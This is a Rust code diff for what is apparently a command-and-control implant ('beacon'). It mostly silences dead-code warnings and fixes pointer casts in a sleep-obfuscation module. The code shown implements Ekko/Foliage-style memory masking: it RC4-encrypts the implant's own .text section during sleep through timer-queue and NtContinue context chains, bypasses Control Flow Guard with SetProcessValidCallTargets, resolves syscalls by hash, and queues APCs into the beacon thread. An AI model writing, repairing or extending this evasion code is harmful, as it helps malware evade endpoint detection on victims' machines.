@@ -167,7 +167,7 @@ pub(crate) struct TextRegion {
 /// # Safety
 /// PEB + PE header reads are stable post-load. Single-threaded context.
 pub(crate) unsafe fn own_text_region() -> Option<TextRegion> {
-    let our_addr = own_text_region as usize;
+    let our_addr = own_text_region as *const () as usize;
     let peb = crate::resolve::peb_pointer()?;
     let ldr = (*peb).ldr;
     if ldr.is_null() {
@@ -224,6 +224,7 @@ pub(crate) unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, 
 
 /// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
 /// Per-boot diversity from the syscall runtime's SSN table.
+#[allow(dead_code)]
 fn mask_key_16() -> [u8; 16] {
     let seed: u32 = crate::syscalls::global()
         .and_then(|rt| rt.ssn_by_hash(crate::resolve::djb2(b"ntdelayexecution")))
@@ -252,6 +253,7 @@ fn mask_key_16() -> [u8; 16] {
 /// thread's parked alertable sleep, and queues an APC into the beacon's
 /// alertable window so the beacon is driven through the masked window without
 /// executing `.text` while it's ciphertext. See [`execute_foliage_apc`].
+#[allow(dead_code)]
 fn execute_foliage_plan(plan: &FoliagePlan) {
     let secs = plan_seconds(plan);
     let region = unsafe { own_text_region() };
@@ -407,6 +409,7 @@ pub fn foliage_stage() -> u8 {
 ///   6. SetEvent(done)                 — signal completion
 ///
 /// Source: https://github.com/Cracked5pider/Ekko (verified C implementation).
+#[allow(dead_code)]
 unsafe fn execute_foliage_apc(
     region: &TextRegion,
     key: &[u8; 16],
@@ -462,7 +465,7 @@ unsafe fn execute_foliage_apc(
     // Ekko timer chain's CONTEXTs point at the COPY, not the .text original.
     // During the sleep window .text is ciphertext, but the RC4 copy lives on
     // its own page — safe to execute.
-    let rc4_shim_addr = rc4_shim as usize;
+    let rc4_shim_addr = rc4_shim as *const () as usize;
     let va_addr_rc4 = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") };
     let va_rc4: unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void =
         match va_addr_rc4 {
@@ -489,7 +492,7 @@ unsafe fn execute_foliage_apc(
     // at the call instruction. Ekko adjusts: Rsp = (Rsp - 8) & ~0xF.
     // Without alignment, the first `call` in VirtualProtect/SystemFunction032
     // triggers STATUS_STACK_BUFFER_OVERRUN (0xC0000409). Source: Cracked5pider/Ekko.
-    let nt_continue_ptr = nt_continue as *mut c_void;
+    let _nt_continue_ptr = nt_continue as *mut c_void;
     crate::entry::diag_mark(b"E1b_ekko");
     FOLIAGE_STAGE.store(2, core::sync::atomic::Ordering::Release);
     crate::entry::diag_mark(b"E1b_cfg");
@@ -546,7 +549,7 @@ unsafe fn execute_foliage_apc(
     // for the NtContinue chain to use.
     let mut ctx_template = crate::context::Context::default();
     ctx_template.set_context_flags(crate::context::CONTEXT_FULL);
-    let ctx_template_ptr = &mut ctx_template as *mut crate::context::Context;
+    let _ctx_template_ptr = &mut ctx_template as *mut crate::context::Context;
     let mut h_new_timer: *mut c_void = core::ptr::null_mut();
 
     // CreateTimerQueueTimer: queue RtlCaptureContext(&ctx_template) at DueTime=0.
@@ -713,6 +716,7 @@ unsafe fn execute_foliage_apc(
 ///
 /// CRITICAL: CFG_CALL_TARGET_INFO.Offset MUST be 16-byte aligned.
 /// Returns true on success or if CFG is not enabled (non-fatal).
+#[allow(dead_code)]
 fn mark_cfg_valid(addr: usize) -> bool {
     // Try the official API first (kernelbase.dll — Win10+).
     let spvct = unsafe {
@@ -730,6 +734,7 @@ fn mark_cfg_valid(addr: usize) -> bool {
 }
 
 /// CFG bypass via SetProcessValidCallTargets (kernelbase.dll).
+#[allow(dead_code)]
 fn mark_cfg_valid_std(addr: usize, spvct: usize) -> bool {
     let nt_query_vm = match unsafe {
         crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory")
@@ -769,6 +774,7 @@ fn mark_cfg_valid_std(addr: usize, spvct: usize) -> bool {
 }
 
 /// Fallback CFG bypass via NtSetInformationVirtualMemory (ntdll).
+#[allow(dead_code)]
 fn mark_cfg_valid_nt(addr: usize) -> bool {
     let nt_query_vm = match unsafe {
         crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory")
@@ -823,6 +829,7 @@ fn mark_cfg_valid_nt(addr: usize) -> bool {
 /// still cleartext (the RC4 hasn't happened yet). The danger window is only
 /// during the NtWait (when .text is ciphertext), and during that window the
 /// thunk executes from the allocated page (not .text), not this shim.
+#[allow(dead_code)]
 unsafe extern "system" fn rc4_shim(
     key: *const u8,
     key_len: usize,
@@ -839,16 +846,19 @@ unsafe extern "system" fn rc4_shim(
 
 /// No-op RC4 shim (diagnostic — does nothing, just returns). Used to test if
 /// the thunk's protect/wait/protect path works WITHOUT the RC4 step.
+#[allow(dead_code)]
 unsafe extern "system" fn rc4_nop(_key: *const u8, _key_len: usize, _buf: *mut u8, _len: usize) {}
 
 /// Pack two usize values (thunk_code_addr + params_addr) into the single
 /// `usize` parameter that `raw_create_thread` accepts.
+#[allow(dead_code)]
 #[repr(C)]
 struct ThunkCallParams {
     thunk_addr: usize,
     params_addr: usize,
 }
 impl ThunkCallParams {
+    #[allow(dead_code)]
     fn pack(thunk_addr: usize, params_addr: usize) -> usize {
         // We can't pass a struct through the usize param, so leak a Box and
         // pass the pointer. The caller (execute_foliage_apc) doesn't reclaim
@@ -874,6 +884,7 @@ impl ThunkCallParams {
 /// # Safety
 /// `param` is a leaked `*mut ThunkCallParams`. The thunk code at `thunk_addr`
 /// must be valid PIC machine code that returns via `ret`.
+#[allow(dead_code)]
 unsafe extern "system" fn foliage_thunk_caller(param: usize) -> u32 {
     let p: &ThunkCallParams = unsafe { &*(param as *const ThunkCallParams) };
 
@@ -892,6 +903,7 @@ unsafe extern "system" fn foliage_thunk_caller(param: usize) -> u32 {
 }
 
 /// Byte snapshot for round-trip verification (leaked box, shared beacon/helper).
+#[allow(dead_code)]
 #[repr(C)]
 struct VerifyState {
     before: [u8; 16],
@@ -899,6 +911,7 @@ struct VerifyState {
 }
 
 /// Parameters passed to the helper thread (leaked box).
+#[allow(dead_code)]
 #[repr(C)]
 struct FoliageParams {
     text_base: usize,
@@ -930,8 +943,9 @@ struct FoliageParams {
 /// The beacon thread's REAL handle (not pseudo) is passed separately via
 /// `FoliageParams::beacon_thread_handle` — `NtQueueApcThread` with a
 /// pseudo-handle resolves to the calling thread, NOT the beacon.
+#[allow(dead_code)]
 #[derive(Clone, Copy)]
-pub(crate) struct FoliageRaw {
+pub struct FoliageRaw {
     nt_protect: usize,
     nt_wait_for_single_object: usize,
     nt_queue_apc_thread: usize,
@@ -940,6 +954,7 @@ pub(crate) struct FoliageRaw {
     wait_for_single_object: usize,
 }
 
+#[allow(dead_code)]
 impl FoliageRaw {
     /// Resolve all the raw exports the Foliage chain needs. Returns None if any
     /// is missing (caller degrades).
@@ -1123,6 +1138,7 @@ pub(crate) unsafe fn raw_create_thread(
 /// # Safety
 /// `param` is a `*mut FoliageParams`. This function takes ownership and
 /// reclaims the box before returning. Mutates the implant's `.text`.
+#[allow(dead_code)]
 unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     // Take ownership of the FoliageParams + VerifyState boxes up front so we
     // can reclaim them on all exit paths. Copy needed fields to locals, then
@@ -1265,6 +1281,7 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
 /// ApcContext3) — NtQueueApcThread's 3 user args). Used to wake the beacon's
 /// alertable sleep benignly. It executes from its own (helper-provided) context
 /// and returns without touching .text.
+#[allow(dead_code)]
 #[allow(unused_variables)]
 unsafe extern "system" fn apc_noop(a1: usize, a2: usize, a3: usize) {
     // Intentionally empty: the APC's purpose is to make the beacon's
@@ -1273,6 +1290,7 @@ unsafe extern "system" fn apc_noop(a1: usize, a2: usize, a3: usize) {
 }
 
 /// Extract the sleep seconds from the plan's Sleep step.
+#[allow(dead_code)]
 fn plan_seconds(plan: &FoliagePlan) -> u32 {
     plan.steps
         .iter()
